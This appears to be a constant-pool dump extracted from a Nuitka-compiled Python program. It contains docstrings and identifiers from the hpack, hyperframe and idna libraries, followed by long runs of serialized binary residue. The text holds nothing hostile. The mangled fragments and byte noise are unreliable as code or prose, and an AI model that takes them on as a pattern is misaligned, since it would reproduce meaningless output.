    Calculates the size of a single entry

    This size is mostly irrelevant to us and defined
    specifically to accommodate memory management for
    lower level implementations. The 32 extra bytes are
    considered the "maximum" overhead that would be
    required to represent each entry in the table.

    See RFC7541 Section 4.1
    aHeaderTableaDEFAULT_SIZEa_maxsizela_current_sizearesizedadequeadynamic_entrieslaSTATIC_TABLE_LENGTHaSTATIC_TABLEaInvalidTableIndexuInvalid table index %du
        Returns the entry specified by index

        Note that the table is 1-based ie an index of 0 is
        invalid.  This is due to the fact that a zero value
        index signals that a completely unindexed header
        follows.

        The entry will either be from the static table or
        the dynamic table depending on the value of index.
        uHeaderTable(%d, %s, %r)atable_entry_sizeaclearaappendlefta_shrinku
        Adds a new entry to the table

        We reduce the table size if the entry will make the
        table size greater than maxsize.
        aSTATIC_TABLE_MAPPINGagetutoo many values to unpack (expected 2)aoffsetapartialu
        Searches the table for the entry specified by name
        and value

        Returns one of the following:
            - ``None``, no match at all
            - ``(index, name, None)`` for partial matches on name only.
            - ``(index, name, value)`` for perfect matches.
        alogadebuguResizing header table to %d from %dacursizeaselfapopuEvicting %s: %s from the header tableu
        Shrinks the dynamic table to be at or below maxsize
        astatic_table_mappingu
    Build static table mapping from header name to tuple with next structure:
    (<minimal index of header>, <mapping from header value to it index>).

    static_table_mapping used for hash searching.
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__acollectionsTadequealoggingaexceptionsTaInvalidTableIndexagetLoggerTuhpack.tableuhpack.tablea__module__u
    Implements the combined static and dynamic header table

    The name and value arguments for all the functions
    should ONLY be byte strings (b'') however this is not
    strictly enforced in the interface.

    See RFC7541 Section 2.3
    a__qualname__l T=Tc:authoritycTc:methodcGETTc:methodcPOSTTc:pathd/Tc:pathc/index.htmlTc:schemechttpTc:schemechttpsTc:statusc200Tc:statusc204Tc:statusc206Tc:statusc304Tc:statusc400Tc:statusc404Tc:statusc500Tcaccept-charsetcTcaccept-encodingcgzip, deflateTcaccept-languagecTcaccept-rangescTcacceptcTcaccess-control-allow-origincTcagecTcallowcTcauthorizationcTccache-controlcTccontent-dispositioncTccontent-encodingcTccontent-languagecTccontent-lengthcTccontent-locationcTccontent-rangecTccontent-typecTccookiecTcdatecTcetagcTcexpectcTcexpirescTcfromcTchostcTcif-matchcTcif-modified-sincecTcif-none-matchcTcif-rangecTcif-unmodified-sincecTclast-modifiedcTclinkcTclocationcTcmax-forwardscTcproxy-authenticatecTcproxy-authorizationcTcrangecTcreferercTcrefreshcTcretry-aftercTcservercTcset-cookiecTcstrict-transport-securitycTctransfer-encodingcTcuser-agentcTcvarycTcviacTcwww-authenticateca__init__uHeaderTable.__init__aget_by_indexuHeaderTable.get_by_indexa__repr__uHeaderTable.__repr__aadduHeaderTable.addasearchuHeaderTable.searchamaxsizeuHeaderTable.maxsizeasetteruHeaderTable._shrinka_build_static_table_mappinguhpack\table.pyu<module hpack.table>Ta__class__TaselfTastatic_table_mappingaindexanameavalueaheader_name_search_resultTaselfacursizeanameavalueTaselfanameavalueasizeTaselfaindexaoriginal_indexTaselfanewmaxaoldmaxT
aselfanameavalueapartialaheader_name_search_resultaindexaoffsetwiwnwvTanameavalueu.hyperframeIu
hyperframe
~~~~~~~~~~

A module for providing a pure-Python HTTP/2 framing layer.
a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_hyperframeu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__u6.0.1a__version__uhyperframe\__init__.pyu<module hyperframe>u.hyperframe.exceptions,aframe_typealengthuUnknownFrameError: Unknown frame type 0x%X received, length %d bytesu
hyperframe/exceptions
~~~~~~~~~~~~~~~~~~~~~

Defines the exceptions that can be thrown by hyperframe.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__TEExceptionla__prepare__aHyperframeErrora__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uhyperframe.exceptionsa__module__u
    The base class for all exceptions for the hyperframe module.

    .. versionadded:: 6.0.0
    a__qualname__a__orig_bases__aUnknownFrameErroru
    A frame of unknown type was received.

    .. versionchanged:: 6.0.0
        Changed base class from `ValueError` to :class:`HyperframeError`
    aintareturna__init__uUnknownFrameError.__init__astra__str__uUnknownFrameError.__str__aInvalidPaddingErroru
    A frame with invalid padding was received.

    .. versionchanged:: 6.0.0
        Changed base class from `ValueError` to :class:`HyperframeError`
    aInvalidFrameErroru
    Parsing a frame failed because the data was not laid out appropriately.

    .. versionadded:: 3.0.2

    .. versionchanged:: 6.0.0
        Changed base class from `ValueError` to :class:`HyperframeError`
    aInvalidDataErroru
    Content or data of a frame was is invalid or violates the specification.

    .. versionadded:: 6.0.0
    uhyperframe\exceptions.pyu<module hyperframe.exceptions>Ta__class__Taselfaframe_typealengthTaselfu.hyperframe.flagsdCa_valid_flagsa_flagsanameu<genexpr>uFlags.__init__.<locals>.<genexpr>asorteda__contains__a__iter__a__len__adiscarduUnexpected flag: {}. Valid flags are: {}aaddu
hyperframe/flags
~~~~~~~~~~~~~~~~

Defines basic Flag and Flags data structures.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__ucollections.abcTaMutableSetlaMutableSetaNamedTupleaIterableaSetaIteratora__prepare__aFlaga__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uhyperframe.flagsa__module__a__qualname__a__annotations__astraintabita__orig_bases__aFlagsu
    A simple MutableSet implementation that will only accept known flags as
    elements.

    Will behave like a regular set(), except that a ValueError will be thrown
    when .add()ing unexpected flags.
    adefined_flagsa__init__uFlags.__init__areturna__repr__uFlags.__repr__wxaobjectabooluFlags.__contains__uFlags.__iter__uFlags.__len__avalueuFlags.discarduFlags.adduhyperframe\flags.pyTa.0aflagu<module hyperframe.flags>Ta__class__TaselfwxTaselfadefined_flagsTaselfTaselfavalueu.hyperframe.frame5fastream_idaFlagsadefined_flagsaflagslabody_lenaselfaaddastream_associationa_STREAM_ASSOC_HAS_STREAMaInvalidDataErroruStream ID must be non-zero for {}a__name__a_STREAM_ASSOC_NO_STREAMuStream ID must be zero for {} with stream_id={}u{}(stream_id={}, flags={}): {}a_body_repra_raw_data_repraserialize_bodyaFrameaparse_frame_header:nlnutoo many values to unpack (expected 2)aparse_bodylaprintu
        Takes a bytestring and tries to parse a single frame and print it.

        This function is only provided for debugging purposes.

        :param data: A memoryview object containing the raw data of at least
                     one complete frame (header and body).

        .. versionadded:: 6.0.0
        a_STRUCT_HBBBLaunpackastructaerroraInvalidFrameErrorTuInvalid frame headerlllllgaFRAMESaUnknownFrameErroraExtensionFrameTatypeastream_idaparse_flagsu
        Takes a 9-byte frame header and returns a tuple of the appropriate
        Frame object and the length that needs to be read from the socket.

        This populates the flags field, and determines how long the body is.

        :param header: A memoryview object containing the 9-byte frame header
                       data of a frame. Must not contain more or less.

        :param strict: Whether to raise an exception when encountering a frame
            not defined by spec and implemented by hyperframe.

        :raises hyperframe.exceptions.UnknownFrameError: If a frame of unknown
            type is received.

        .. versionchanged:: 5.0.0
            Added :param:`strict` to accommodate :class:`ExtensionFrame`
        aflag_byteapackllatypeu
        Convert a frame into a bytestring, representing the serialized form of
        the frame.
        u
        Given the body of a frame, parses it into frame data. This populates
        the non-header parts of the frame: that is, it does not populate the
        stream ID or flags.

        :param data: A memoryview object containing the body data of the frame.
                     Must not contain *more* data than the length returned by
                     :meth:`parse_frame_header
                     <hyperframe.frame.Frame.parse_frame_header>`.
        a__class__a__init__apad_lengthaPADDEDa_STRUCT_Bcu!B:nlnTuInvalid Padding dataawarningsawarnutotal_padding contains the same information as pad_length.aDeprecationWarningadepends_onastream_weightaexclusivea_STRUCT_LBg:nlnTuInvalid Priority datalladataaserialize_padding_datadatobytesaparse_padding_dataaInvalidPaddingErrorTuPadding is too long.u
        The length of the frame that needs to be accounted for when considering
        flow control.
        uexclusive={}, depends_on={}, stream_weight={}aserialize_priority_datauPRIORITY must have 5 byte body: actual length %s.aparse_priority_dataaerror_codeuerror_code={}a_STRUCT_LuRST_STREAM must have 4 byte body: actual length %s.TuInvalid RST_STREAM bodyaACKTuSettings must be empty if ACK flag is set.asettingsusettings={}aitemsa_STRUCT_HLuSETTINGS ack frame must not have payload: got %s byteslTuInvalid SETTINGS bodyapromised_stream_idupromised_stream_id={}, data={}TuInvalid PUSH_PROMISE bodyuInvalid PUSH_PROMISE promised stream id: %saopaque_datauopaque_data={!r}uPING frame may not have more than 8 bytes of data, got %ruPING frame must have 8 byte length: got %salast_stream_idaadditional_dataulast_stream_id={}, error_code={}, additional_data={!r}a_STRUCT_LL:nlnTuInvalid GOAWAY body.:lnnawindow_incrementuwindow_increment={}uWINDOW_UPDATE frame must have 4 byte length: got %sTuInvalid WINDOW_UPDATE bodyTuWINDOW_UPDATE increment must be between 1 to 2^31-1uexclusive={}, depends_on={}, stream_weight={}, data={}aPRIORITYudata={}TuAltSvc origin must be bytestring.TuAltSvc field must be a bytestring.aoriginafielduorigin={!r}, field={!r}a_STRUCT_H:llnTuInvalid ALTSVC frame body.abodyutype={}, flag_byte={}, body={}u
        For extension frames, we parse the flags by just storing a flag byte.
        u
        A broad override of the serialize method that ensures that the data
        comes back out exactly as it came in. This should not be used in most
        user code: it exists only as a helper method if frames need to be
        reconstituted.
        aNoneabinasciiahexlifyadecodeTaascii:nlnu...u<hex:wrw>u
hyperframe/frame
~~~~~~~~~~~~~~~~

Defines framing logic for HTTP/2. Provides both classes to represent framed
data and logic for aiding the connection when it comes to reading from the
socket.
a__doc__a__file__a__spec__ahas_locationa__cached__a__annotations__aexceptionsTaUnknownFrameErroraInvalidPaddingErroraInvalidFrameErroraInvalidDataErrorTaFlagaFlagsaFlagaOptionalaTupleaListaIterableaAnyaDictaTypelaFRAME_MAX_LENlaFRAME_MAX_ALLOWED_LENuhas-streamuno-streamaeithera_STREAM_ASSOC_EITHERaStructTu>HBBBLTu>LLTu>HLTu>LBTu>LTu>HTu>Buhyperframe.framea__module__u
    The base class for all HTTP/2 frames.
    a__qualname__TTareturnuFrame.__init__DareturnOstra__repr__uFrame.__repr__uFrame._body_reprTaFrameOintaexplainuFrame.explainTFaheaderastrictuFrame.parse_frame_headeruFrame.parse_flagsDareturnObytesaserializeuFrame.serializeuFrame.serialize_bodyDadataareturnOmemoryviewnuFrame.parse_bodyu
    Mixin for frames that contain padding. Defines extra fields that can be
    used and set by frames that can be padded.
    aPaddingTlakwargsuPadding.__init__uPadding.serialize_padding_dataDadataareturnOmemoryviewOintuPadding.parse_padding_dataDareturnOintatotal_paddinguPadding.total_paddingu
    Mixin for frames that contain priority data. Defines extra fields that can
    be used and set by frames that contain priority data.
    aPriorityTlpFuPriority.__init__uPriority.serialize_priority_datauPriority.parse_priority_dataa__prepare__aDataFramea__getitem__u%s.__prepare__() must return a mapping, not %su<metaclass>u
    DATA frames convey arbitrary, variable-length sequences of octets
    associated with a stream. One or more DATA frames are used, for instance,
    to carry HTTP request or response payloads.
    TaEND_STREAMlTaPADDEDlTcaintabytesuDataFrame.__init__uDataFrame.serialize_bodyamemoryviewuDataFrame.parse_bodyapropertyaflow_controlled_lengthuDataFrame.flow_controlled_lengtha__orig_bases__aPriorityFrameu
    The PRIORITY frame specifies the sender-advised priority of a stream. It
    can be sent at any time for an existing stream. This enables
    reprioritisation of existing streams.
    astruPriorityFrame._body_repruPriorityFrame.serialize_bodyuPriorityFrame.parse_bodyaRstStreamFrameu
    The RST_STREAM frame allows for abnormal termination of a stream. When sent
    by the initiator of a stream, it indicates that they wish to cancel the
    stream or that an error condition has occurred. When sent by the receiver
    of a stream, it indicates that either the receiver is rejecting the stream,
    requesting that the stream be cancelled or that an error condition has
    occurred.
    uRstStreamFrame.__init__uRstStreamFrame._body_repruRstStreamFrame.serialize_bodyuRstStreamFrame.parse_bodyaSettingsFrameu
    The SETTINGS frame conveys configuration parameters that affect how
    endpoints communicate. The parameters are either constraints on peer
    behavior or preferences.

    Settings are not negotiated. Settings describe characteristics of the
    sending peer, which are used by the receiving peer. Different values for
    the same setting can be advertised by each peer. For example, a client
    might set a high initial flow control window, whereas a server might set a
    lower value to conserve resources.
    TaACKlaHEADER_TABLE_SIZEaENABLE_PUSHaMAX_CONCURRENT_STREAMSaINITIAL_WINDOW_SIZEaMAX_FRAME_SIZEaMAX_HEADER_LIST_SIZEaENABLE_CONNECT_PROTOCOLTlnuSettingsFrame.__init__uSettingsFrame._body_repruSettingsFrame.serialize_bodyuSettingsFrame.parse_bodyaPushPromiseFrameu
    The PUSH_PROMISE frame is used to notify the peer endpoint in advance of
    streams the sender intends to initiate.
    TaEND_HEADERSlTlcuPushPromiseFrame.__init__uPushPromiseFrame._body_repruPushPromiseFrame.serialize_bodyuPushPromiseFrame.parse_bodyaPingFrameu
    The PING frame is a mechanism for measuring a minimal round-trip time from
    the sender, as well as determining whether an idle connection is still
    functional. PING frames can be sent from any endpoint.
    uPingFrame.__init__uPingFrame._body_repruPingFrame.serialize_bodyuPingFrame.parse_bodyaGoAwayFrameu
    The GOAWAY frame informs the remote peer to stop creating streams on this
    connection. It can be sent from the client or the server. Once sent, the
    sender will ignore frames sent on new streams for the remainder of the
    connection.
    lTlppcuGoAwayFrame.__init__uGoAwayFrame._body_repruGoAwayFrame.serialize_bodyuGoAwayFrame.parse_bodyaWindowUpdateFrameu
    The WINDOW_UPDATE frame is used to implement flow control.

    Flow control operates at two levels: on each individual stream and on the
    entire connection.

    Both types of flow control are hop by hop; that is, only between the two
    endpoints. Intermediaries do not forward WINDOW_UPDATE frames between
    dependent connections. However, throttling of data transfer by any receiver
    can indirectly cause the propagation of flow control information toward the
    original sender.
    uWindowUpdateFrame.__init__uWindowUpdateFrame._body_repruWindowUpdateFrame.serialize_bodyuWindowUpdateFrame.parse_bodyaHeadersFrameu
    The HEADERS frame carries name-value pairs. It is used to open a stream.
    HEADERS frames can be sent on a stream in the "open" or "half closed
    (remote)" states.

    The HeadersFrame class is actually basically a data frame in this
    implementation, because of the requirement to control the sizes of frames.
    A header block fragment that doesn't fit in an entire HEADERS frame needs
    to be followed with CONTINUATION frames. From the perspective of the frame
    building code the header block is an opaque data segment.
    TaPRIORITYl uHeadersFrame.__init__uHeadersFrame._body_repruHeadersFrame.serialize_bodyuHeadersFrame.parse_bodyaContinuationFrameu
    The CONTINUATION frame is used to continue a sequence of header block
    fragments. Any number of CONTINUATION frames can be sent on an existing
    stream, as long as the preceding frame on the same stream is one of
    HEADERS, PUSH_PROMISE or CONTINUATION without the END_HEADERS flag set.

    Much like the HEADERS frame, hyper treats this as an opaque data frame with
    different flags and a different type.
    uContinuationFrame.__init__uContinuationFrame._body_repruContinuationFrame.serialize_bodyuContinuationFrame.parse_bodyaAltSvcFrameu
    The ALTSVC frame is used to advertise alternate services that the current
    host, or a different one, can understand. This frame is standardised as
    part of RFC 7838.

    This frame does no work to validate that the ALTSVC field parameter is
    acceptable per the rules of RFC 7838.

    .. note:: If the ``stream_id`` of this frame is nonzero, the origin field
              must have zero length. Conversely, if the ``stream_id`` of this
              frame is zero, the origin field must have nonzero length. Put
              another way, a valid ALTSVC frame has ``stream_id != 0`` XOR
              ``len(origin) != 0``.
    l
TcpuAltSvcFrame.__init__uAltSvcFrame._body_repruAltSvcFrame.serialize_bodyuAltSvcFrame.parse_bodyu
    ExtensionFrame is used to wrap frames which are not natively interpretable
    by hyperframe.

    Although certain byte prefixes are ordained by specification to have
    certain contextual meanings, frames with other prefixes are not prohibited,
    and may be used to communicate arbitrary meaning between HTTP/2 peers.

    Thus, hyperframe, rather than raising an exception when such a frame is
    encountered, wraps it in a generic frame to be properly acted upon by
    upstream consumers which might have additional context on how to use it.

    .. versionadded:: 5.0.0
    uExtensionFrame.__init__uExtensionFrame._body_repruExtensionFrame.parse_flagsuExtensionFrame.parse_bodyuExtensionFrame.serializea_FRAME_CLASSESuhyperframe\frame.pyu<module hyperframe.frame>Ta__class__Taselfastream_idaoriginafieldakwargsa__class__Taselfastream_idadataakwargsa__class__Taselfatypeastream_idaflag_byteabodyakwargsa__class__Taselfastream_idaflagsaflagTaselfastream_idalast_stream_idaerror_codeaadditional_dataakwargsa__class__Taselfastream_idapad_lengthakwargsa__class__Taselfastream_idaopaque_dataakwargsa__class__Taselfastream_idadepends_onastream_weightaexclusiveakwargsa__class__Taselfastream_idapromised_stream_idadataakwargsa__class__Taselfastream_idaerror_codeakwargsa__class__Taselfastream_idasettingsakwargsa__class__Taselfastream_idawindow_incrementakwargsa__class__TaselfTadatawrTadataaframealengthTaselfapadding_lenTaselfadataaorigin_lenTaselfadataTaselfadataapadding_data_lengthTaselfadataapadding_data_lengthapriority_data_lengthTaselfadataabody_lenwianameavalueTaselfaflag_byteTaselfaflag_byteaflagaflag_bitTaheaderastrictafieldsalengthatypeaflagsastream_idaframeTaselfaflagsaheaderTaselfabodyaflagsaflagaflag_bitaheaderTaselfaorigin_lenTaselfapadding_dataapaddingTaselfapadding_dataapaddingapriority_dataTaselfapadding_dataapaddingadataTaselfawarningsu.idnam.a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_idnau\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__apackage_dataTa__version__la__version__lacoreTaIDNABidiErroraIDNAErroraInvalidCodepointaInvalidCodepointContextaalabelacheck_bidiacheck_hyphen_okacheck_initial_combineracheck_labelacheck_nfcadecodeaencodeaulabelauts46_remapavalid_contextjavalid_contextoavalid_label_lengthavalid_string_lengthaIDNABidiErroraIDNAErroraInvalidCodepointaInvalidCodepointContextaalabelacheck_bidiacheck_hyphen_okacheck_initial_combineracheck_labelacheck_nfcadecodeaencodeaulabelauts46_remapavalid_contextjavalid_contextoavalid_label_lengthavalid_string_lengthaintrangesTaintranges_containaintranges_containLaIDNABidiErroraIDNAErroraInvalidCodepointaInvalidCodepointContextaalabelacheck_bidiacheck_hyphen_okacheck_initial_combineracheck_labelacheck_nfcadecodeaencodeaintranges_containaulabelauts46_remapavalid_contextjavalid_contextoavalid_label_lengthavalid_string_lengtha__all__uidna\__init__.pyu<module idna>u.idna.coreaunicodedataacombininglanameuUnknown character in unicodedataaintranges_containaidnadataascriptsaencodeTapunycodeuU+{:04X}lllutoo many values to unpack (expected 2)abidirectionaluaIDNABidiErroruUnknown directionality in label {} at position {}TwRaALaANabidi_labelTwRaALwLuFirst codepoint in label {} must be directionality L, R or ALT
wRaALaANaENaESaCSaETaONaBNaNSMuInvalid direction for codepoint at position {} in a right-to-left labelTwRaALaENaANaNSMTaANaENanumber_typeTuCan not mix numeral types in a right-to-left labelTwLaENaESaCSaETaONaBNaNSMuInvalid direction for codepoint at position {} in a left-to-right labelTwLaENavalid_endingTuLabel ends with illegal codepoint directionalityacategorywMaIDNAErrorTuLabel begins with an illegal combining character:llnu--TuLabel has disallowed hyphens in 3rd and 4th positionw-qTuLabel must not start or end with a hyphenanormalizeaNFCTuLabel must be in Normalization Form Cl@a_combining_classa_virama_combining_classajoining_typesagetlTTlLlDTlRlDl@lllla_is_scriptaGreekllaHebrewlau・aHiraganaaKatakanaaHanlll
l
TObytesObytearrayadecodeTuutf-8TuEmpty Labelacheck_nfcacheck_hyphen_okacheck_initial_combineracodepoint_classesaPVALIDaCONTEXTJavalid_contextjalabelaInvalidCodepointContextuJoiner {} not allowed at position {} in {}a_unotaCONTEXTOavalid_contextouCodepoint {} not allowed at position {} in {}aInvalidCodepointuCodepoint {} at position {} of {} not allowedacheck_bidiTaasciiaulabelavalid_label_lengthTuLabel too longacheck_labela_alabel_prefixa_punycodealowerastartswithTuMalformed A-label, no Punycode eligible content foundTuA-label must not end with a hyphenTuInvalid A-labelauts46dataTauts46datalabisectabisect_leftwZlwVwDw3aoutputwIuRe-map the characters in the string according to UTS46 processing.aasciiTushould pass a unicode string to the function rather than a byte string.auts46_remapasplitTw.a_unicode_dots_reTuEmpty domainaalabelaresultTuEmpty labelcd.avalid_string_lengthTuDomain too longTuInvalid ASCII in A-labelw.a__doc__a__file__a__spec__aoriginahas_locationa__cached__TaidnadataareaUnionaOptionalaintrangesTaintranges_containlcxn--acompileTu[.。．｡]TEUnicodeErrora__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uidna.corea__module__u Base exception for all IDNA-encoding related problems a__qualname__a__orig_bases__u Exception when bidirectional requirements are not satisfied u Exception when a disallowed or unallocated codepoint is used u Exception when the codepoint is not valid in the context it is used DacpareturnOintpDacpascriptareturnOstrpOboolDwsareturnOstrObytesDwsareturnOintOstrTObytesOstrareturnatrailing_dotTFDalabelacheck_ltrareturnOstrOboolpDalabelareturnOstrOboolDalabelareturnOstrnDalabelaposareturnOstrOintOboolDalabelaposaexceptionareturnOstrOintOboolpTOstrObytesObytearrayDalabelareturnOstrObytesTtFDadomainastd3_rulesatransitionalareturnOstrOboolpOstrTFpppwsastrictauts46astd3_rulesatransitionalTFppuidna\core.pyu<module idna.core>TacpwvTacpascriptTwsTalabelalabel_bytesTalabelacheck_ltrabidi_labelaidxacpadirectionartlavalid_endinganumber_typeTalabelTalabelaposacpacp_valueTwsastrictauts46astd3_rulesatrailing_dotaresultalabelsalabelTwsastrictauts46astd3_rulesatransitionalatrailing_dotaresultalabelsalabelTadomainastd3_rulesatransitionalauts46dataaoutputaposacharacode_pointauts46rowastatusareplacementTalabelaposacp_valueaokwiajoining_typeTalabelaposaexceptionacp_valueacpTalabelatrailing_dot.idna.idnadatasWa__doc__a__file__a__spec__aoriginahas_locationa__cached__u15.1.0a__version__DaGreekaHanaHebrewaHiraganaaKatakanaT$g
g
g
g
ggggggggt:gu:gu:gv;g|>g|>g|>g}>g}>g}>g}>g}>g}>g~?g~?g?g?g?g?g?ḡBgʭgggƤTg]g]g_g`g`g`g`gggggĿgg
g
g
ggggg˦gTgggggggggTgagag
g
g
gTgagbgdgegfggg
g
g
g
g
g
g
ascriptsDllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
l
lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll l l l l l l l l l l l l l l l l l l l l l l l!l!l!l!l!l&l&l&l.l.l.l.l.l.l.l.l.l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l/l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l0l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l2l2l2l2l2l2l2l2l2l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l4l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l5l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l6l7l7l7l7l7l7l7l7l7l7l7l7l7l7l7l7l7l7l8l8l8l8l8l8l8l8l8l8l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l9l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l;l@l@l@l@l@l@l@l@l@l@l@l@l@l@l@l@l@l@l@l@lAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlAlYlYlYlZl[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l[l`l`l`l`lalalllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllÕlĕlŕlǕlɕlʕl͕lΕlϕlЕlѕlҕlӕlԕlՕl֕lוlؕlٕlڕlەlܕlݕlޕlߕlllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllÞlĞlƞlǞlȞlɞlʞl˞l̞l͞lΞlϞlОlўlҞlӞlԞlllllllllllllllllllllllllllllllllllllllßlğlɟlʟl˟llllllllllll làlĠlŠlƠlllllllllllll¡lllllllllllllllllllllllllllllɣlʣlˣḷlϣlllllllllߥllllllllllllllllllllllllllllllllll¨lèlĨlƨlިllllllllll©lélllllllllܫlݫlllllllllllllllllllllllllllllllllllllllllllllllòlԳlճlֳl׳lڳl۳llllllllllllllllllllllǴlѴlҴlӴlԴlմlִlٴlڴl۴lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllºlúlĺlźlǺlllllllllllllll¾llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllÞlĞlŞlƞlllllllllllllllllllllllllllllll¤lälĤlllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll´lôlĴlŴlƴlǴlȴlɴlʴl˴l̴lʹlδlϴlдlѴlҴlӴlԴlմlִl״lشlٴlڴl۴lܴlݴl޴lߴllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8lÀ8lĀ8lŀ8lƀ8lǀ8lȀ8lɀ8lʀ8lˀ8l̀8l̀8l΀8lπ8lЀ8lр8lҀ8lӀ8lԀ8lՀ8lր8l׀8l؀8lـ8lڀ8lۀ8l܀8l݀8lހ8l߀8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8lÂ8lĂ8lł8lƂ8lǂ8lȂ8lɂ8lʂ8l˂8l̂8l͂8l΂8lς8lЂ8lт8l҂8lӂ8lԂ8lՂ8lւ8lׂ8l؂8lق8lڂ8lۂ8l܂8l݂8lނ8l߂8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8lÃ8lă8lŃ8lƃ8lǃ8lȃ8lɃ8lʃ8l˃8l̃8l̓8l΃8lσ8lЃ8lу8l҃8lӃ8lԃ8lՃ8lփ8l׃8l؃8lك8lڃ8lۃ8l܃8l݃8lރ8l߃8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8l8lTpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplDlRppplDlRlDlRlDpppplRppplDpppppppppppplClDpppppplRlDplTpppppppppppppppppppplDplTlRppppplDppppppppppppppplRppppppppppppppppplDppppppppppppppppppppppppppppppppppppplRlDplRpppppppplDlRlDlRlDplRpplTpppppppppppppppppplRplDppplTlRlTlDpplRpppplDppplRlDpppppppplRlDlRlDlRlDplRlTpppppppppppppppppppppppppplRlDpppppppppplRpplDpppppppppppppplRplDppplRlDlRplDpplRplDppppplTpppppppppplDpppppppppppppppppppppppppppppppplTpppppppplClTppppppppppppppppppppplRlDpppplRplDlRlDppppppppplRlDlRpplTpplDpppplRlDlRpppppppppppppppppppplCpplDppppplRlTppppppplDppppppppplRppplDplRplDppppplRlDpppppppppppppplTpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplDlClTppplDpppppppppppppppppppppppppppppppppppppppppppppppppppppp